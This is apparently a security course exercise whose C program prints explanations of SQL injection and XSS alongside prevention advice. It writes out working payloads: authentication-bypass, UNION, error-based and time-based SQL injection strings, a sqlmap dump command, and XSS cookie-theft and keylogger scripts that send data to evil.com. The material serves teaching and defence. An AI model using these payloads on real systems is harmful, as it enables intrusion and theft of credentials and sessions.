# ex18: SQL Injection & Cross-Site Scripting

**Module**: 2.9 - Computer Security
**Difficulte**: Difficile
**Duree**: 5h
**Score qualite**: 97/100

## Concepts Couverts

### 2.9.34: SQL Injection (8 concepts)
| Ref | Concept | Application |
|-----|---------|-------------|
| a | Classic injection | ' OR '1'='1 |
| b | Union-based | UNION SELECT |
| c | Error-based | Extract via errors |
| d | Blind boolean | Yes/no questions |
| e | Blind time-based | Sleep on true |
| f | Second-order | Stored, triggered later |
| g | Prevention | Parameterized queries |
| h | sqlmap | Automated testing |

### 2.9.35: Cross-Site Scripting (8 concepts)
| Ref | Concept | Application |
|-----|---------|-------------|
| a | Reflected XSS | In response |
| b | Stored XSS | In database |
| c | DOM XSS | Client-side |
| d | Payload | <script>alert(1)</script> |
| e | Cookie theft | document.cookie |
| f | Keylogging | Capture input |
| g | Prevention | Escape output |
| h | CSP | Content Security Policy |

---

## Sujet

Comprendre et exploiter les injections SQL et XSS.

---

## Exemple

```c
#include "sqli_xss.h"

int main(void) {
    printf("=== SQL Injection ===\n\n");

    // SQLi concept
    printf("SQL Injection:\n");
    printf("  User input directly in SQL query\n");
    printf("  Attacker manipulates query logic\n");

    printf("\n  Vulnerable code:\n");
    printf("    query = \"SELECT * FROM users WHERE id = '\" + input + \"'\";\n");
    printf("\n  Normal: input = \"5\"\n");
    printf("    SELECT * FROM users WHERE id = '5'\n");
    printf("\n  Attack: input = \"' OR '1'='1\"\n");
    printf("    SELECT * FROM users WHERE id = '' OR '1'='1'\n");
    printf("    Always true -> returns all users!\n");

    // Classic injection
    printf("\n\n=== Classic SQL Injection ===\n\n");

    printf("Authentication bypass:\n");
    printf("  Query: SELECT * FROM users WHERE user='$u' AND pass='$p'\n");
    printf("\n  Attack:\n");
    printf("    user: admin'--\n");
    printf("    pass: anything\n");
    printf("  Result:\n");
    printf("    SELECT * FROM users WHERE user='admin'--' AND pass='...'\n");
    printf("    Comment (--) ignores password check!\n");

    printf("\n  Variations:\n");
    printf("    ' OR 1=1--\n");
    printf("    ' OR 'x'='x\n");
    printf("    admin'/*\n");
    printf("    1' OR '1'='1\n");

    // UNION-based
    printf("\n\n=== UNION-Based Injection ===\n\n");

    printf("Extract data from other tables:\n");
    printf("  Original: SELECT name, price FROM products WHERE id = '$id'\n");
    printf("\n  Attack: id = 1 UNION SELECT username, password FROM users--\n");
    printf("  Result:\n");
    printf("    SELECT name, price FROM products WHERE id = 1\n");
    printf("    UNION\n");
    printf("    SELECT username, password FROM users--\n");
    printf("\n  Requirements:\n");
    printf("    - Same number of columns\n");
    printf("    - Compatible data types\n");

    printf("\n  Finding column count:\n");
    printf("    ' ORDER BY 1-- (ok)\n");
    printf("    ' ORDER BY 2-- (ok)\n");
    printf("    ' ORDER BY 3-- (error) -> 2 columns\n");

    // Error-based
    printf("\n\n=== Error-Based Injection ===\n\n");

    printf("Extract data through error messages:\n");
    printf("  ' AND extractvalue(1, concat(0x7e, (SELECT password FROM users LIMIT 1)))--\n");
    printf("\n  Error message reveals data:\n");
    printf("    XPATH syntax error: '~secretpassword'\n");

    // Blind injection
    printf("\n\n=== Blind SQL Injection ===\n\n");

    printf("Boolean-based (yes/no):\n");
    printf("  ' AND (SELECT SUBSTRING(password,1,1) FROM users)='a'--\n");
    printf("  Different response if true vs false\n");
    printf("  Extract character by character\n");

    printf("\n  Time-based:\n");
    printf("  ' AND IF((SELECT SUBSTRING(password,1,1))='a', SLEEP(5), 0)--\n");
    printf("  Response delayed = condition true\n");
    printf("  Slower but works when no output visible\n");

    // Second-order
    printf("\n\n=== Second-Order Injection ===\n\n");

    printf("Stored payload, triggered later:\n");
    printf("  1. Register username: admin'--\n");
    printf("  2. Username safely stored in DB\n");
    printf("  3. Later, app uses username in query:\n");
    printf("     SELECT * FROM data WHERE owner = '$username'\n");
    printf("     Becomes: ... WHERE owner = 'admin'--'\n");
    printf("  4. Injection executes!\n");

    // Prevention
    printf("\n\n=== SQL Injection Prevention ===\n\n");

    printf("1. Parameterized queries (BEST):\n");
    printf("   stmt = conn.prepare(\"SELECT * FROM users WHERE id = ?\")\n");
    printf("   stmt.execute([user_input])\n");
    printf("   Input NEVER interpreted as SQL\n");

    printf("\n2. ORM (Object-Relational Mapping):\n");
    printf("   User.find(id: params[:id])\n");
    printf("   Abstraction handles escaping\n");

    printf("\n3. Input validation (defense in depth):\n");
    printf("   Whitelist expected characters\n");
    printf("   Reject unexpected input\n");

    printf("\n4. Least privilege:\n");
    printf("   DB user only has needed permissions\n");
    printf("   No DROP TABLE rights!\n");

    // sqlmap
    printf("\n\nsqlmap (Automated tool):\n");
    printf("  sqlmap -u 'http://site.com/page?id=1' --dbs\n");
    printf("  Automatically:\n");
    printf("  - Detects injection points\n");
    printf("  - Identifies DB type\n");
    printf("  - Extracts data\n");
    printf("  - Dumps databases\n");

    // XSS
    printf("\n\n=== Cross-Site Scripting (XSS) ===\n\n");

    printf("XSS:\n");
    printf("  Inject malicious JavaScript into web page\n");
    printf("  Executes in victim's browser\n");
    printf("  Steals cookies, credentials, data\n");

    // Reflected XSS
    printf("\n\n=== Reflected XSS ===\n\n");

    printf("Payload in request, reflected in response:\n");
    printf("  URL: https://site.com/search?q=<script>alert(1)</script>\n");
    printf("\n  Server response:\n");
    printf("    <p>Search results for: <script>alert(1)</script></p>\n");
    printf("\n  Attack:\n");
    printf("    1. Attacker crafts malicious URL\n");
    printf("    2. Sends link to victim\n");
    printf("    3. Victim clicks, script runs in their browser\n");
    printf("    4. Script sends cookies to attacker\n");

    // Stored XSS
    printf("\n\n=== Stored XSS ===\n\n");

    printf("Payload stored in database:\n");
    printf("  1. Attacker posts comment:\n");
    printf("     <script>new Image().src='http://evil.com/?c='+document.cookie</script>\n");
    printf("  2. Comment stored in DB\n");
    printf("  3. Every visitor loads comment\n");
    printf("  4. Script executes, steals cookies\n");
    printf("\n  More dangerous: Affects all visitors!\n");

    // DOM XSS
    printf("\n\n=== DOM-Based XSS ===\n\n");

    printf("Payload processed client-side:\n");
    printf("  Vulnerable code:\n");
    printf("    var name = location.hash.substring(1);\n");
    printf("    document.getElementById('output').innerHTML = name;\n");
    printf("\n  Attack:\n");
    printf("    https://site.com/page#<img src=x onerror=alert(1)>\n");
    printf("\n  Server never sees payload!\n");
    printf("  Harder to detect/log\n");

    // XSS payloads
    printf("\n\n=== XSS Payloads ===\n\n");

    printf("Basic:\n");
    printf("  <script>alert(1)</script>\n");
    printf("  <script>alert(document.domain)</script>\n");

    printf("\nWithout script tags:\n");
    printf("  <img src=x onerror=alert(1)>\n");
    printf("  <svg onload=alert(1)>\n");
    printf("  <body onload=alert(1)>\n");
    printf("  <input onfocus=alert(1) autofocus>\n");

    printf("\nCookie theft:\n");
    printf("  <script>new Image().src='http://evil.com/?c='+document.cookie</script>\n");

    printf("\nKeylogger:\n");
    printf("  <script>document.onkeypress=function(e){\n");
    printf("    new Image().src='http://evil.com/?k='+e.key};</script>\n");

    // XSS Prevention
    printf("\n\n=== XSS Prevention ===\n\n");

    printf("1. Output encoding:\n");
    printf("   HTML context: &lt; &gt; &amp; &quot;\n");
    printf("   JavaScript: \\x3c \\x3e\n");
    printf("   URL: %%3C %%3E\n");

    printf("\n2. Content-Security-Policy:\n");
    printf("   Content-Security-Policy: script-src 'self'\n");
    printf("   Blocks inline scripts!\n");

    printf("\n3. HttpOnly cookies:\n");
    printf("   Set-Cookie: session=abc; HttpOnly\n");
    printf("   JavaScript cannot access\n");

    printf("\n4. Input validation:\n");
    printf("   Whitelist allowed characters\n");
    printf("   Sanitize HTML (DOMPurify)\n");

    printf("\n5. Framework protections:\n");
    printf("   React, Angular auto-escape by default\n");
    printf("   Avoid dangerouslySetInnerHTML/[innerHTML]\n");

    return 0;
}
```

---

## Fichiers

```
ex18/
├── sqli_xss.h
├── sql_injection.c
├── xss_attacks.c
├── prevention.c
└── Makefile
```
